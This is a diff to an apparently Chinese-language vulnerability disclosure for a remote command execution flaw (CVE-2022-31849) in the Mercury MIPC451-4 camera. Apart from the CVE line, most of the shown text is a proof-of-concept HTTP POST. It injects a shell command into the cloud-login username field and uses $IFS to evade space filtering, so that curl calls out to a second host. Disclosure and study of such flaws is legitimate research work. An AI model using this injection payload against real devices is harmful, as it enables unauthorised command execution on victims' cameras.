@@ -12,6 +12,8 @@
 
 **发现者**: [SkYe231](mailto:skye231@foxmail.com)@Hillstone
 
+**CVE**:  CVE-2022-31849
+
 ## 漏洞描述
 
 水星 MIPC451-4 存在远程命令执行，远程攻击者可以通过精心构造的数据包绕过限制，实现远程命令执行。
@@ -86,8 +88,12 @@ int FUN_00024aa4(byte *param_1)
 
 2. 发送云账号登录包，触发远程命令执行
 
+    > 根据实际情况替换
+    >
+    > Stok:05173d0162e8c77387fa1bbc12b2fa62
+    >
     > Command:`curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231'`
-
+    
     ```
     POST /stok=05173d0162e8c77387fa1bbc12b2fa62/ds HTTP/1.1
     Host: 192.168.0.103
@@ -104,6 +110,6 @@ int FUN_00024aa4(byte *param_1)
     
     {"cloud_config":{"bind":{"username":"\"}';curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231';'{\"@mrskye.com","password":"admin123"}},"method":"do"}
     ```
-
+    
     
 
